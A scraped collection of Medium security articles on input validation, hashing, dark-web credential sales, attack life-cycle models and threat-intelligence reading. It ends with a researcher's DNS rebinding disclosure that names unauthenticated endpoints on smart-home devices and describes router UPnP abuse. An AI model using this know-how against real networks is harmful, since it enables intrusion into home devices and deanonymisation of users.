Application Security : What is server side input validation? Why is it needed anyway?,https://medium.com/@BaYinMin/application-security-what-is-server-side-input-validation-why-is-it-needed-anyway-e0613c733548?source=tag_archive---------8-----------------------,"TL;DR Don’t rely on client side input validation. Data sent from client side can be manipulated in many way beating any validation checks. The same input validation must be performed on the server side!
Most of the time when the development team receives penetration testing report, they may keep seeing the following words among the phrases:
Normally, by the time the report reaches to the development team hands, the timeline is already too tight and the roll-out deadline is imminent. Thus, the frustration ensued upon receipt of pentest report with lots of issues. So, some rephrased version of frustrated development team responses tend to be:
“I have developed the functionally correct application according to the application requirements but why does the penetration testing report keep coming back with a lot of issues?”.
There are input validation in place! How can this happen? Can you show me how you performed the testing?
Some rephrased version of project manager response tend to be:
I saw similar issues in previous phases. Why is the same issue happening again?
Thus, the main focus is this article is to help developer aware of the basic security testing approach so that to demystify the “hacking” of application in typical penetration testing. Let’s go through with a sample application.
A simple form submission application:
The following is very simple form submission application as follow:
So, the input validation has been performed according to business need. The functionality is correct. So, there should be no security issue right? The answer, unfortunately, is that there are security issues with this application.
The data transmission flow
Let’s take a look at the typical data flow in web application. Please refer to diagram below. So, for the sane people, the users will just access the application via browser and submit the form. The form data will go through the network. Subsequently, the data will hit the server and server would return the appropriate response (return flow is not shown in the diagram). In this context, it is reasonable to assume that client side javascript will help prevent invalid/dangerous data sending to the server.
Looking under the hood
So here is the simple code snipper for this application. The front end was built with html/javascript powered by python flask backend.
But the people are insane!
So, an unreasonable malicious user can change the data flow completely and bypass the validation checks. Now, look at the new data flow in the diagram below. A proxy tool can easily intercept/replay the HTTP Request and javascript deterrence is a mere minor inconvenience. I used the BrupSuite free proxy tool to intercept the traffic. There are many other active proxy tools out there which can change request data on the fly such as Zed Attack etc.
Sample Fix : Performing Server Side Input Validation!
Now, let’s do same rule of input validation on the server side!.
Conclusion
Let’s say that client side validation or javascript validation is just to deter casual sane user from abusing the application and also to promote a form of usability of the application. But malicious hackers or our well-intention penetration testers do not really concern with the input restriction enforced through client side in terms of UI restriction and validation. They see the application through different lens. I hope the very basic explanation on the testing approach will demystify the “hacking” process.
Code Securely and stay safe! It’s an insane world out there :D
Check the github page here for sample application code.
Written by
","['Cybersecurity', 'Application Security', 'Hacking', 'Application Development']"
A Quick Introduction: Hashing - HackerNoon.com - Medium,https://medium.com/hackernoon/a-quick-introduction-hashing-c32d1dc91871?source=tag_archive---------8-----------------------,"Hashing is a method of determining the equivalence of two chunks of data. A cryptographic hash function is an irreversible function that generates a unique string for any set of data. Examples of these data could be files, strings, streams, and any other items that can be represented in binary format.
You’ve probably seen a hash string on the downloads page of some of your favorite tools, packages, or libraries. For example, Kali Linux has one for each of its releases. But why is that?
This is to ensure that the original file on their server is the same as the one that you’ve downloaded. For example, the SHA-256 hash of the Kali ISO is below.
If you download the file, you should hash your local copy. If the resulting hash is equivalent to the one found on their website, you can rest assured that the file has not been tampered with during the download and that you have the same, correct file.
Excellent question. Let’s get technical! I’m assuming you have Python 2 installed, by the way.
1- Let’s import the library we need.
2- Now let’s choose our hashing algorithm. For more information on their differences, check this out.
3- We’re basically set up, now we’ll go ahead test the function on a string.
Awesome, there’s a SHA-256 hash of the string “Hello World!”. Now we’ll prove that the hash is different for similar data.
It’s totally different.
4- Now that we know that our function works, let’s try it on a file
There we go. You’ve got some pretty good knowledge of hashing now. So, go. Go on! Secure the integrity of your data and hash all the things!
Also, follow me on Twitter and Github, please.
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Security', 'Blockchain', 'Software Development', 'Cybersecurity', 'Mathematics']"
Are you for sale on the dark web? - Claudia Iannazzo - Medium,https://medium.com/@ClaudiaIannazzo/are-you-for-sale-on-the-dark-web-a962d0677a9d?source=tag_archive---------6-----------------------,"It’s 4.29am and my 19 month-old daughter is awake and screaming for food. Like a slow moving zombie from The Walking Dead, I drag myself to the fridge, grab the bottle of milk, and dozily slam it into her outstretched plump hands. I put her back in her crib and stagger back to bed. Before I close my eyes, I pick up my phone from my side table to quickly scan the emails overnight (I know — a bad habit that one of these days I’m going to break).
So I was awake at 4.32am when Yahoo emailed me to tell me I had just changed my password on my account. And suddenly I’m wide awake. I’d forgotten I even had that account!
I quickly open my laptop: there’s the email notification from Yahoo about the password change. 10 seconds later Yahoo sends me a second email explaining that my recovery email has been deleted. A few seconds later they send me a third email cheerily reminding me that I had just successfully deleted my recovery phone number too. And then it happened — the thing that really got my adrenaline going. I saw the hacker go into my primary email account (which is not a Yahoo account) and delete these Yahoo notifications. If I hadn’t been wide awake at 4.32am I would never have known that I had lost control of my Yahoo account and that my other email was also compromised.
So now it’s on — a race against the hacker to reclaim my accounts and change my passwords. Not just across my email accounts but across my bank accounts, my software accounts, my file sharing. Everything. Passwords to over 200 online systems were changed over the next 90 minutes. Did I get it all in time? Am I safe? Probably not.
If you’re reading this and thinking hacking is something that happens to “other people”, think again. Chances are you’ve already been hacked. In my case, the hacker probably bought my username and password on the dark web (a hacker call Peace is purportedly selling 200 million Yahoo usernames and passwords on the dark web for 3 bitcoins, currently~$1,810).
And I’m not alone. 68 million Dropbox usernames and passwords from 2012 are also on the dark web selling for two bitcoins (~USD$1,220) (Karen Turner of the Washington Post reports), 117 million Linkedin accounts (from the 2012 hack) are selling for 5 bitcoins (~USD$3,050) (Lorenzo Franceschi-Bicchierai of Motherboard reports), and 50 million former iMesh users’ passwords are selling for a bargain price of 1 bitcoin (~USD$610) (Zach Wittaker for Zero Day reports).
What can you do when your email is hacked? Here’s some good advice from Suzanne Kantra at Techlicious and Omri Topppl at BlogDog. I’ve also now installed a password manager and taken some other long overdue precautions, that will enable me to change my life’s passwords in seconds, not hours.
According to IT security firm Serveria, there are over 360 million stolen sets of personal data for sale on the dark web. So your username and password are very likely already selling like hot cakes somewhere. It might not be 4.32am where you are, but it’s definitely time to wake up.
Written by
","['Security', 'Passwords', 'Cybersecurity', 'Hacking', 'Dark Web']"
A Survey of Attack Life-Cycle Models - Jym - Medium,https://medium.com/@jym/a-survey-of-attack-life-cycle-models-8bd04557af72?source=tag_archive---------3-----------------------,"Earlier, I talked about Beyond Confidentiality, Integrity & Availability which touched on the info-security concepts beyond ICT systems and a brief introduction to the Three Tenets Model which is in use by US Air-force research laboratory.
This round, instead the usual writing style of just dumping info/opinions, I want to share some views of Threat Capability with a episode from a popular US TV series Mr Robot. All scenes are works of Universal Cable Productions & Mr Robot(TM) seems to be owned by Novasoft. This is not-for-profit, please don’t send me lawyer letters.
Without further a do, let’s take a look at Season 1 episode 6 :
Being an anti-social person with several mental conditions, he prefers to connect with people by hacking them.
In this particular episode, Elliot provided anonymous tips to the police which got the most of the key people of the drug syndicate busted. Elliot was prompted to do so because the drug syndicate boss (named Vera) was a physical threat to Elliot’s friend Shayla. Shayla works for Vera as more than a peddler (eg. his sex toy) and she was selling drugs to Elliot.
It was a matter of time that Vera figured out Elliot was behind this, so he ordered his brother (who escaped the police raid) & remaining crew to take Shayla as hostage so as to force Elliot to free him.
Elliot did some research on the facility that the Boss was being held. Apparently it was controlled by systems that had vulnerable Programmable Logic Controllers. These are the little gadgets that opens/closes gates and so on.
Notice the ‘E’ logo on the USB stick? It’s the corporate logo of the largest corporation E-Corp which basically owned the country in this story. Charlene took advantage of this familiar and ‘trusted’ logo to attempt to infiltrate the correction (prisons if you are more UK’ish) facility.
Sure enough, an officer took the bait and inserted into his computer.
Charlene planted a malware within a ‘survey-for-goodies’ program which the officer went on to take but the malware was stopped in the process. Take note of the wall mounted screens (top left) which showed street-views.
Officer yanked the power cord out from his terminal.
Elliot lost connection to the officer’s PC at his end. He had to go on-site.
Elliot visited Vera, he wants Vera to talk to him to buy some more time. Vera challenged Elliot why was he stupid enough to show up to physically implicate himself. Elliot assured Vera that all the doors will open at night. Vera was very pleased with Elliot’s plan.
While the two was chatting, Elliot’s phone was scanning the wireless networks. Unfortunately, the wireless networks are protected with WPA2 which will need some time to crack... Not much time left….
After Elliot claimed his phone and walked out the facility, hope materialized in the form of a blue-tooth keyboard which he was confident to break into. The keyboard was in turned connected to the patrol car computer system that had a mobile camera-feed over 4G network into the facility’s system. Recall the earlier scene where there were wall mounted screens, those street-views were captured by these 4G mobile car cameras.
Elliot got the gang members to get ahead of the patrol car. He needed 40 seconds max to own the blue-tooth keyboard which was within range.
To free Charlene from being the second hostage, Elliot threaten the gang member to let Charlene go or he would abort the whole mission. Charlene did a good job with her assets and flirting skills.
Elliot did his chops and bingo. Sure, the computer may be hardened but fortunately for Elliot, they missed out the keyboard.
While the officer was busy looking elsewhere, Elliot uploads the payload and launched the malicious time-activated process.
The payload worked as programmed. It shut off the lights for a few minutes and opened the prison gates simultaneously.
As the lights went back on, the inmates broke the gate and the mission was a success! But unfortunately, Elliot would only see Shayla’s body but Vera was kind enough to let Elliot go after killing his own brother whom got him into trouble in the first place by conducting drug transactions openly in social media networks.
All these are still rather high-level and certain details of Elliot’s capabilities are not evident. It will be useful to further expound Threat Capabilities with more in-depth models that cover more specifically the attacker’s Tactics, Techniques & Procedures.
Lockheed Martin adapted a military concept of a Kill-Chain (Find, Fix, Track, Target, Engage and Assess) and applied it to Cyber:
This model is useful but creates the impression that things are rather linear and one-off. There is no notion of external and internal reconnaissance. No notion of ‘Lateral Movement/Incursion’ and so on.
The folks at Mandiant further expanded the model to include tactics like Establish Foothold, Escalate Privilege, Move Laterally & Maintain Presence.
Mandiant’s diagram has a ‘cyclical’ view of which can be seen as the Attack Cycle Life can be repeated again on a different target within the organization so as to establish a stronghold and ultimately complete the mission. In reality, this is often the case which Mandiant as a professional Digital Forensics and Incident Response company observed through their many engagements.
The folks at Mitre Research expanded on Cyber Kill Chain and came up the ATT&CK model cum framework which focuses on post-intrusion adversarial behavior & techniques:
ATT&CK incorporates information on cyber adversaries gathered through MITRE research as well as from other disciplines such as penetration testing and red teaming to establish a collection of knowledge characterizing the post-access activities of adversaries. While there is significant research on initial exploitation and use of perimeter defenses, there is a gap in central knowledge of adversary process after initial access has been gained. ATT&CK focuses on TTPs adversaries use to make decisions, expand access, and execute their objectives. It aims to describe an adversary’s steps at a high enough level to be applied widely across platforms, but still maintain enough details to be technically useful:
This matrix is very useful, particular from a protection and detection perspective. Because these techniques are specific (perhaps with exception of Host Enumeration which could be done by let’s say a sys-admin), the signatures/rules that can pick this out will be likely less noisy. I will leave the discussion of this matrix of techniques in the next sharing.
I combined these models into:
I borrowed the idea of Phase from Boeing’s Threat Life-Cycle which supposedly predates Cyber-Kill-Chain. We can think of the Phases as severity levels which increase with number. For instance, an internal recon is more severe than an external recon since the attacker is most likely already within the environment. It is also safe to assume that the attacker(s) had gotten past the earlier phases/defenses and is likely to proceed to the next objective.
I placed the two different classes of actors along side with the tactics (external recon, deliver payload….) within each phase. The complicated cycles and arrows attempt to illustrate that these tactics are not necessary linear/one-after-the-other and carried out in order. Consider attacks like DDoS which can start with Phase 1 — External Recon and straight to the systems’ availability being impacted without the need to go through Phase 2 or 3.
I also further expanded on the Phase 4 — Actions on Objectives. Attackers’ objectives in turn becomes our problems which impact data or systems dependability. In my earlier sharing, I briefly covered the attributes of Dependability which is applicable to both ICT and Cyber-Physical systems.
An external attacker can also steal information along the way, thus from the initial intrusion, s/he can start evasive extraction of information out bit-by-bit (no pun intended but some clever folks manage to piggy back info packet by packet through DNS requests or jump across air-gaps by manipulating the heating-cooling system), or further recon internally & lay low to plan for the next step which could be get to another victim within the organization after studying the org-chart from the intranet site or existing documents within the compromised machine.
Insider Threats are the most difficult given the authorized access and internal knowledge of the systems and processes. Much of insider actions will not be flagged as attacks since they are allowed to use the system in the first place. It is usually a series of legitimate actions that performed over a period of time (eg. printing out sensitive documents as with fraud) or at a single instance (eg. angry employee/contractor shuts down plant controls as with sabotage) that become threatening.
They say always begin with the end in mind. The end in Elliot’s mind was to open the gates and shut off the lights for a few minutes… Now let’s work backwards to connect the dots:
Elliot had to gather info to figure out that he needed a payload to control the PLC within the prisons system. With the knowledge, he had to quickly create a payload that would instruct the PLC to do what he wanted (weaponization). And since his first intrusion failed, he had to go on-site to scan the network to find another way to deliver the main PLC payload but it turned out to be unfavorable for his time-limited mission. It shows his persistence, which is the P in the APT — Advance Persistent Threat.
The ‘E-corp’ USB sticks were strategically dropped (delivery) at a place where officers would walk pass. Someone took the bait and launched the ‘survey’ program laced with a malware (execution). The first intrusion was almost successful (Elliot had a remote control shell for a while) until the officer yanked out the power cord after seeing the Anti-Virus (a typical security control on endpoints) alert.
The second successful intrusion was after attacking blue-tooth wireless keyboard which could be remotely taken over to deliver the PLC payload. Elliot then migrated payload code to the process that had the necessary privilege to control the gates and lights.
Elliot tried three different vectors (USB, Wifi network and ultimately Bluetooth) before gaining control. The officer’s PC and patrol-car terminal can be thought of as a stepping stones or pivoting points into the prisons network. Suppose the officer’s PC was compromised, then Elliot could have more time to move along laterally to other systems within the network by abusing the officer’s credentials and rights. Ultimately, Elliot took over the keyboard and used the car’s terminal to perform internal recon, uploaded the time-activated PLC payload and injected the malicious code to the control system software process. Amazing as it may seem, all that was done in 40 seconds. If it’s not dramatic then it won’t look that ‘Advance’. :P
The whole point of the story was Elliot hacking the control system to set Vera free so as to free Shayla. Before he could open the gates and off the lights for that amount of time he desired, he had to go through all these various steps. This story is an example of Cyber-Physical systems being breached and result to consequences beyond just information breach.
If we look at the Insider problem with the Three Tenets Model “lens”, you will realize the problem of Insiders is difficult simply because they have valid access to the resources and systems. Does it take a lot of skill to deliberately or carelessly press delete? That’s why in my combined ALC, I reasoned that Phase 1 & 2 are quite irrelevant to an Insider given their access and knowledge of the systems. The problem is further compounded by the abuse of credentials by external actors which could make it look like an insider job. Insider Threat Management is a big topic that requires separate treatment. I believe the general idea to treat Insider should take into considerations of Motivation as with the Motivation, Opportunity & Means perspectives since the last two are given for Insiders.
Now that we have looked at it from the external attacker’s perspective and how attacks can be generalized and modeled by an Attack Life-Cycle, the next sharing will cover how ALC is used in a defensive setting.
Written by
","['Cybersecurity', 'Security']"
A Top 10 Reading List if You’re Getting Started in Cyber Threat Intelligence,https://medium.com/katies-five-cents/a-top-10-reading-list-if-youre-getting-started-in-cyber-threat-intelligence-c11a18fc9798?source=tag_archive---------5-----------------------,"I’ve been thinking about writing this blog post for a while, but I felt like there are versions of this out there already, so didn’t bother. But then I realized I was falling into a trap I warn people about all too often…just because your content is entirely new doesn’t mean it won’t be useful to someone! With that, inspired by this thread from Courtney and fully admitting I have a lot of overlap with Scott Roberts’ excellent CTI Reading List, here are 10 recommendations for what you should read (and sometimes watch) if you’re starting out in Cyber Threat Intelligence (CTI). Plus, they’re all free because I realize those starting out may not have a ton of extra $ to spend on books or classes.
1. Industrial Control Threat Intelligence by Sergio CaltagironeThis isn’t just about Industrial Control Systems (ICS). This is a beautifully-written, concise paper that provides the fundamentals of what you need to know about CTI: a definition of it (which I use in my CTI presentations), indicators vs. analytics, tactical/operational/strategic levels, and the “CART” approach to measuring threat intelligence quality. If you’re not familiar with ICS, no worries — consider the ICS parts as examples of the points he makes in the paper. I try not to fangirl too much, but I fully embrace being a Sergio fangirl, and I feel that this paper justifies my feelings. I also recommend reading Sergio’s blog, including posts that are a couple years old —good CTI blog posts are like fine wine, they get better with age.
2. Psychology of Intelligence Analysis by Richards HeuerThis book breaks down how to think about how we think. Very meta, I know, but being aware of your own cognitive limitations and biases is key if you want to be a good CTI analyst. Richards Heuer is the OG when it comes to cognitive biases, and this is an excellent, approachable read that’s full of examples, fun diagrams, and clear explanations. Use caution, though…if you read this, you might start hyper-analyzing biases you see in yourself and others! (And you’ll be a breath of fresh air, especially if you’re on Twitter!)
3. Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains by Eric Hutchins, Michael Cloppert, and Rohan AminAlso known as “the Kill Chain paper,” this represents the first in the “CTI framework triumvirate” that I consider required reading for any analyst. Even if you feel like the Kill Chain is old news, I encourage you to take some time to thoughtfully read this paper. Check out the different definitions of indicators (since this is a topic of hot debate in this community) as well as the courses of action, which are often overlooked. The intrusion attempt examples in the paper can also be helpful to new analysts who have never worked an intrusion themselves.
4. The Diamond Model of Intrusion Analysis by Sergio Caltagirone, Andrew Pendergast, and Chris BetzThe Diamond Model is a simple but powerful model every analyst should understand, and it’s the second of the “big three” CTI frameworks. Even if you don’t use it on your team, it’s helpful to understand the parts of an intrusion. This paper also has a lot of useful CTI fundamentals that we need to understand about adversaries — check out the axioms for many of those (like Axiom 7, which gives a nice definition of Advanced Persistent Threat). Yes, this is a long, academic paper, so I recommend breaking it up into a few sittings, but I promise that the time you devote to reading it will pay off in the end.
5. MITRE ATT&CK™: Design and Philosophy by Blake Strom, et al I was a co-author of this paper, so I’m biased (how could I mention Heuer in this post and not call out my own biases??!?), but I think the community has bought into the idea that this whole ATT&CK thing can be pretty useful. I consider ATT&CK to be the third framework that all CTI analysts should be familiar with, and this paper explains the philosophy behind ATT&CK and how it’s structured. After reading this paper, I suggest heading over to the Groups page and skimming some examples of techniques to give you a feel for ATT&CK. You also might find the Getting Started page or my recent Sp4rkcon presentation to be helpful in learning more.
6. A Brief History of Attribution Mistakes by Sarah JonesThis is an important presentation for newer analysts to read and heed. True attribution back to a person is extremely difficult, and even attribution to a group can be tough. Sarah explains some common mistakes to watch out for when you’re trying to do attribution. After you check out Sarah’s presentation (you can also watch the video here), I highly recommend scrolling through more CTI Summit presentations. I was a fan of the CTI Summit long before I joined the advisory board because it’s one of the few non-CTI-vendor-specific conferences that focuses solely on this field (the FIRST CTI Symposium is another), and there are many excellent presentations from it.
7. CTI SquadGoals — Setting Requirements by Scott J. RobertsA common issue among CTI teams is that they completely miss the point of it — CTI is supposed to help someone outside the CTI team itself. One way you can ensure your CTI team is trying to help support decision-making is by creating requirements. I love this blog post by Scott because it not only explains what requirements are but also provides practical examples of them to help get you started. Requirements don’t have to be scary! (Of course, you should then read more of Scott’s blog posts, because he has many great ones.)
8. Threat Intelligence Naming Conventions: Threat Actors, & Other Ways of Tracking Threats by Robert M. LeeLike struggling with attribution, the issue of naming actors is almost a rite of passage for analysts to figure out. I went through this mental struggle myself a couple years ago and came out of it with an understanding of why we can’t say that different names from different companies are “the same” actors. I’m cheating because this is a video, but I think Rob does an awesome job of clearly explaining why naming is so challenging and why we’ll never be able to “just agree on one name.” If you can understand this early on in your CTI career, you’ll be ahead of the game and save yourself a lot of torment.
9. Does a BEAR Leak in the Woods? by Toni GidwaniThere are so many blog posts, reports, and presentations on adversary activity out there, but I like this one because it covers many key things a CTI analyst should know — who Fancy Bear and Cozy Bear are, what happened in the DNC breach, how to apply the Diamond Model, how to pivot, and how to wade through a lot of conflicting information to try to make sense of what adversaries did. You can also view the video of Toni’s Shmoocon 2017 presentation here. This was the first time I saw Toni speak (she’s awesome, so go see her if you get a chance), and it remains one of my all-time favorite conference presentations (along with No Easy Breach by Nick Carr and Matt Dunwoody, which you should also watch).
10. Cyber Intelligence Tradecraft Report — The State of Cyber Intelligence Practices in the United States by Jared EttingerThis is a carefully-written and well-researched report by Jared and the team at the Carnegie Mellon Software Engineering Institute. Though it has a US focus, I think it’s a good primer for best practices to look for on a CTI team. Yes, it’s a long read, but if you take the time to dive into it (or even just skim the headings and read parts that interest you), you can learn a lot about common issues to avoid on a CTI team and best practices to strive for.
In addition to those resources, I also wanted to mention two repos you can check out for much more reading:
Scott covers books very well in his post, but I’d like to highlight three books that I find particularly worthwhile:
There are many, many more CTI resources out there if you look, but those are some of my recommendations to get you started. Happy reading!
***
The author’s affiliation with The MITRE Corporation is provided for identification purposes only and is not intended to convey or imply MITRE’s concurrence with, or support for, the positions, opinions, or viewpoints expressed by the author.
Written by
","['About Katie', 'APTNotes', 'Feedly', 'Cybersecurity', 'Cyber Threat', 'Intelligence']"
Attacking Private Networks from the Internet with DNS Rebinding,https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325?source=tag_archive---------0-----------------------,"TL;DR Following the wrong link could allow remote attackers to control your WiFi router, Google Home, Roku, Sonos speakers, home thermostats and more.
The home WiFi network is a sacred place; your own local neighborhood of cyberspace. There we connect our phones, laptops, and “smart” devices to each other and to the Internet and in turn we improve our lives, or so we are told. By the late twenty teens, our local networks have become populated by a growing number of devices. From smart TVs and media players to home assistants, security cameras, refrigerators, door locks and thermostats, our home networks are a haven for trusted personal and domestic devices.
Many of these devices offer limited or non-existent authentication to access and control their services. They inherently trust other machines on the network in the same way that you would inherently trust someone you’ve allowed into your home. They use protocols like Universal Plug and Play (UPnP) and HTTP to communicate freely between one another but are inherently protected from inbound connections from the Internet by means of their router’s firewall. They operate in a sort of walled garden, safe from external threat. Or so their developers probably thought.
A few months ago, I began to follow a winding path of research into a 10 year-old network attack called DNS rebinding. Put simply, DNS rebinding allows a remote attacker to bypass a victim’s network firewall and use their web browser as a proxy to communicate directly with devices on their private home network. By following the wrong link, or being served a malicious banner advertisement, you could inadvertently provide an attacker with access to the thermostat that controls the temperature in your home.
To better understand how DNS rebinding works it’s helpful to first understand the security mechanism that it evades; the web browser’s same-origin policy. Many moons ago, browser vendors decided it probably wouldn’t be a good idea for web pages served from one domain to be able to make arbitrary requests to another domain without explicit permission from that second domain. If you follow a malicious link on the web, the web page you arrive at shouldn’t be able to make an HTTP request to your bank website and leverage your logged in-session there to empty your account. Browsers restrict this behavior by limiting HTTP requests originating from a domain to access only other resources that are also located on that domain (or another domain that explicitly enables cross-origin resource sharing).
DNS can be abused to trick web browsers into communicating with servers they don’t intend to.
The code at http://malicious.website can’t make a standard XMLHttpRequest to http://bank.com/transfer-fund because malicious.website and bank.com are different domains and therefor the browser treats them as separate origins. Browsers enforce this by requiring that the protocol, domain name, and port number of a URL being requested is identical to the URL of the page requesting it. Sounds good, right?
Not so fast. Behind every domain name lies an IP address. malicious.website may reside at 34.192.228.43 and bank.com may call 171.159.228.150 home. The Domain Name System (DNS) provides a useful mechanism of translating easy-to-remember domain names into the IP addresses that our computer’s actually use to talk to each other. The catch is that modern browsers use URLs to evaluate same-origin policy restrictions, not IP addresses. What would happen if the IP address of malicious.website were to quickly changed from 34.192.228.43 to the IP address of 171.159.228.150? According to the browser, nothing would have changed. But now, instead of communicating with the server that originally hosted the website files at malicious.website, your browser would actually be talking to bank.com. See the problem? DNS can be abused to trick web browsers into communicating with servers they don’t intend to.
DNS rebinding has received a few brief moments of attention over the past year when vulnerabilities were found in a few popular pieces of software. Most notably, Blizzard’s video games, the Transmission torrent client, and several Ethereum cryptocurrency wallets were vulnerable to DNS rebinding attacks until recently. In just the wrong circumstance, the Ethereum Geth vulnerability could have given a remote attacker full-control of the victim’s Ethereum account, and with it, all of their coin.
DNS rebinding allows a remote attacker to bypass a victim’s network firewall and use their web browser as a proxy to communicate directly with devices on their private home network.
This scenario is an actual exploit (CVE-2018–11315) that I’ve found and used against my Radio Thermostat CT50 “smart” thermostat. The implications and impact of an attack like this can have far reaching and devastating effects on devices or services running on a private network. By using a victim’s web browser as a sort of HTTP proxy, DNS rebinding attacks can bypass network firewalls and make every device on your protected intranet available to a remote attacker on the Internet.
After finding and exploiting this vulnerability in the very first device that I poked around with, I feared that there were likely many other IoT devices that could also be targeted. I began to collect and borrow some of the more popular smart home devices on the market today. Over the next few weeks every device that I got my hands on fell victim to DNS rebinding in one way or another, leading to information being leaked, or in some cases, full device control. Google Home, Chromecast, Roku, Sonos WiFi speakers, and certain smart thermostats could all be interfaced with in some way by an unauthorized remote attacker. Seems like a big problem huh?
The idea that the local network is a safe haven is a fallacy. If we continue to believe it people are going to get hurt.
I’ve been in contact with the vendors of these products and all of them are working on or have already released security patches (more on that disclosure in this essay). Those are just the companies whose devices I’ve personally tested in my spare time. If companies with such high profiles are failing to prevent against DNS rebinding attacks there must be countless other vendors that are as well.
I’ve authored a proof-of-concept exploit that you can use to target these devices on your home network today. That demo is live at http://rebind.network.
The apps used to control Google Home products make use of an undocumented REST API running on port 8008 of these devices (e.g. http://192.168.1.208:8008). The first mention of this service that I’ve been able to find surfaced back in 2013 when Brandon Fiquett wrote about a Local API he found while sniffing the WiFi traffic to his Chromecast. Fast forward five years and it seems that Google has integrated that same mysterious API into all of its Google Home products, and as you can imagine, that undocumented API is fairly well documented by amateurs and hobbyists at this point. In fact, earlier this year Rithvik Vibhu published detailed API docs to the public.
This API provides extensive device control without any form of authentication. Some of the most interesting features include the ability to launch entertainment apps and play content, scan and join nearby WiFi networks, reboot, and even factory reset the device.
Imagine a scenario where you’re browsing the web and all of a sudden your Google Home factory resets. What if your roommate left their web browser open on their laptop and an HTML advertisement sends your Chromecast into reboot loops while you are trying to watch a movie? One of my favorite attack scenarios targeting this API is an abuse of the WiFi scanning capability. Attackers could pair this information with publicly accessible wardriving data and get accurate geolocation using only your list of nearby WiFi networks. This attack would be successful even if you’ve disabled your web browser’s geolocation API and are using a VPN to tunnel your traffic through another country.
Here is an example of some of the data that I’ve exfiltrated from my own Chromecast. Can you figure out where I might be writing this post from?
Like Google Home, Sonos WiFi speakers can also be controlled by a remote attacker (CVE-2018–11316). By following the wrong link you could find your pleasant evening jazz play list interrupted by content of a very different sort. That’s fun for simple pranks, but ultimately pretty harmless, right?
After a bit of digging I found a few other interesting links to be followed on the Sonos UPnP web server that might not be so innocent. It appears that several hidden web pages are accessible on the device for debugging purposes. http://192.168.1.76:1400/support/review serves an XML file that appears to contain the output of several Unix commands run on the Sonos device (which itself seems to run a distribution of Linux).
http://192.168.1.76:1400/tools provides a bare bones HTML form that lets you run a few of these Unix commands on the Sonos device yourself! The Sonos HTTP API allows a remote attacker to map internal and external networks using the traceroute command and probe hosts with ICMP requests with ping using simple POST requests. An attacker could use a Sonos device as a pivot point to gather useful network topology and connectivity information to be used in a follow up attack.
While exploring the network in the lounge at my work building, I found an HTTP server running on port 8060 of a RokuTV. I soon found that Roku’s External Control API provides control over basic functionality of the device, like launching apps, searching, and playing content. Interestingly, it also allows direct control over button and key presses like a virtual remote, as well as input for several sensors including an accelerometer, orientation sensor, gyroscope and even a magnetometer (why?) As you’ve probably guessed, this local API requires no authentication and can be exploited via DNS rebinding (CVE-2018–11314).
I reported these findings to the Roku security team, who initially responded saying:
There is no security risk to our customers’ accounts or the Roku platform with the use of this API… We are aware of web apps like http://remoku.tv that can be loaded into a browser and used to interact with the Roku on the same local network.
After describing a detailed attack scenario, a security VP at the company clarified that their team does “consider this a valid threat and it is not mundane in the least.” To the team’s credit, they immediately halted the release roll out of Roku OS 8.1 and began to develop a patch, which they expected could take as long as 3–4 months if they couldn’t find a solution that worked in time for their upcoming release.
After some consideration, I informed the team that I was working with a reporter at WIRED and that we were likely going to publish the research quickly. The next morning I received an email from the team that a patch had been developed and was already in the process of being pushed to over 20 million devices through a firmware update!
The Radio Thermostat CT50 & CT80 devices have by far the most consequential IoT device vulnerabilities I’ve found so far. These devices are some of the cheapest “smart” thermostats available on the market today. I purchased one to play with after being tipped off to their lack of security by CVE-2013–4860, which reported that the device had no form of authentication and could be controlled by anyone on the network. Daniel Crowley of Trustwave SpiderLabs had attempted to contact the vendor several times before ultimately publishing the vulnerability after hearing no response from the company. Unfortunately, this lack of response is a recurring theme of vulnerability disclosure over the years, especially with smaller manufacturers. I expected that the chances that the vulnerability had gone unpatched for five years was actually high, so I purchased a brand new CT50.
That assumption turned out to be correct and the thermostat’s control API left the door wide open for DNS rebinding shenanigans. It’s probably pretty obvious the kind of damage that can be done if your building’s thermostat can be controlled by remote attackers. The PoC at http://rebind.network exfiltrates some basic information from the thermostat before setting the target temperature to 95° F. That temperature can be dangerous, or even deadly in the summer months to an elderly or disabled occupant. Not to mention that if your device is targeted while you’re on vacation you could return home to a whopper of a utility bill.
The severity of this vulnerability, and the continued negligence by the Radio Thermostat Company of America who’ve had years to fix it, are perfect examples of why we need security regulation for IoT devices.
If you’ve been following all of this so far you may have already started to think of other devices on home networks that could be targeted. Would it surprise you to learn that, historically, network routers themselves are some of the most common targets to DNS rebinding attacks? Probably not.
That’s because network routers hold the keys to the kingdom. Own the router and you own the network. There are two common attack vectors that I’ve seen with DNS rebinding:
The first is pretty basic. Many routers ship with default login credentials and consumers never change them. Sure, maybe they will enable WPA2 and set a WiFi password, but I bet many of them don’t realize their router’s configuration panel is still accessible to anyone on the network using “admin:admin”.
The second attack is even worse, a downright travesty. Somehow, in this day and age, most brand-spanking-new home routers still ship with UPnP servers enabled by default. These UPnP servers provide admin-like control over router configuration to any unauthenticated machine on the network over HTTP. Any machine on the network, or the public Internet through DNS rebinding, can use IGD/UPnP to configure a router’s DNS server, add & remove NAT and WAN port mappings, view the # of bytes sent/received on the network, and access the router’s public IP address (check out upnp-hacks.org for more info).
A DNS rebinding attack that targets a router’s UPnP server can punch a hole in the victim’s firewall, leaving a permanent entry point to execute raw TCP & UDP attacks against devices on the network without being bound to the normal HTTP-only limitations of DNS rebinding attacks. They can even configure port forwarding rules that forward traffic to external IP addresses on the Internet, allowing an attacker to add a victim’s router as a node in a large network of infected routers that can be used to mask their traffic from authorities (see Akamai’s recent UPnProxy research).
IGD also provides an interface to discover a router’s public IP address through a simple unauthenticated HTTP request. This functionality, combined with DNS rebinding, can be used to de-anonymize users who are otherwise attempting to mask their public IP address through a VPN or by using TOR.
In my experience router vulnerability to DNS rebinding is a mixed bag. I’ve seen routers that completely block DNS rebinding attacks, routers that randomize their UPnP server port to make discovery and attack more difficult, and I’ve seen routers that are completely wide-open to the attack. I should mention though that I’ve largely stayed away from applying my DNS rebinding research to routers so far... Mostly because I’m almost too afraid to look �.
